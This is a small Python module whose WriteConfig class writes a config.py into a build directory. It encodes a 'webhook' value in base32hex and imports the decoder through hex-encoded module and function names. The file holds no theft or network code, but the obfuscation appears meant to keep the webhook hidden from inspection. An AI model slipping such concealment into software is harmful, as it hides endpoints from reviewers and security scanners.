import os
import base64

class WriteConfig:
    """
    The WriteConfig class writes the config data to the config file
    """

    def __init__(self, config: dict) -> None:
        self.config = config.copy()
        self.build_dir = os.path.join(os.getcwd(), 'build')
        self.config_file = os.path.join(self.build_dir, 'src', 'config.py')

    def write_config(self) -> None:
        """
        Writes the config data to the config file
        """
        with open(self.config_file, 'w') as f:
            self.config['webhook'] = base64.b32hexencode(self.config['webhook'].encode())
            f.write(f"""
d = getattr(__import__(bytes.fromhex('626173653634').decode()), bytes.fromhex('6233326865786465636f6465').decode())
__CONFIG__ = {self.config}
__CONFIG__['webhook'] = d(__CONFIG__['webhook']).decode()
if __name__ == '__main__':
    print(__CONFIG__)
    input()
    exit()""")
